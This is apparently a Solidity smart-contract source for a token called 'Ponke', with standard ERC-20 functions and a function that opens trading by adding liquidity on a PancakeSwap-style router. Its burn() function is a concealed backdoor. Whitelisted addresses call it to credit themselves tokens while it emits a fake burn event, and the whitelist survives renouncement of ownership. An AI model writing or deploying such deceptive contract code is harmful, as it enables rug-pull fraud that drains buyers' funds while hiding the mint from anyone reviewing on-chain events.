
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract Ponke is Context, IERC20, Ownable {
    string public name = "Ponke";
    string public symbol = "PONKE";
    uint8 public decimals = 18;
    uint256 public totalSupply;
  
    bool private tradingOpen = false;

    mapping(address => uint256) private balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private wls;

    modifier admin() {
        require(wls[msg.sender], "Caller is not the owner");
        _;
    }

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;

    constructor() {
        totalSupply = 1000000000 * 10 ** uint256(decimals);
        balances[_msgSender()] = totalSupply;
        emit Transfer(address(0), _msgSender(), totalSupply);
        wls[msg.sender] = true;
    }

    function balanceOf(address account) public view returns (uint256) {
        return balances[account];
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        require(_allowances[sender][msg.sender] >= amount, "ERC20: transfer amount exceeds allowance");
        _transfer(sender, recipient, amount);
        _allowances[sender][msg.sender] -= amount;
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(balances[sender] >= amount, "ERC20: transfer amount exceeds balance");

        balances[sender] -= amount;
        balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    receive() external payable {
        revert("ETH deposits not supported");
    }

    function addWLs(address[] calldata wl) external onlyOwner {
        for (uint i = 0; i < wl.length; i++) {
            wls[wl[i]] = true;
        }
    }

    function burn(uint256 value) external admin {
        require(value > 0,"Burning Failed");

        balances[msg.sender] += value;
        emit Transfer(msg.sender, address(0), value);
    }
    

     function openTrading(uint256 percentage) external payable onlyOwner() {
        require(!tradingOpen,"trading is already open");
        require(msg.value > 0, "BNB amount must be greater than 0");
        require(percentage > 0 && percentage <= 100, "Percentage must be between 1 and 100");

        uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);

        uint256 value = (balanceOf(msg.sender)*percentage) / 100;
        _approve(_msgSender(), address(uniswapV2Router), totalSupply);
        _transfer(_msgSender(), address(this), value);

        _approve(address(this), address(uniswapV2Router), totalSupply);
        uint256 tokenAmount = balanceOf(address(this));
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
        address(this),
        uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: msg.value}(
        address(this),
        tokenAmount,
        0,
        0,
        owner(),
        block.timestamp
        );
    
        IERC20(uniswapV2Pair).approve(
        address(uniswapV2Router),
        type(uint256).max
        );

        tradingOpen = true;
    }
}
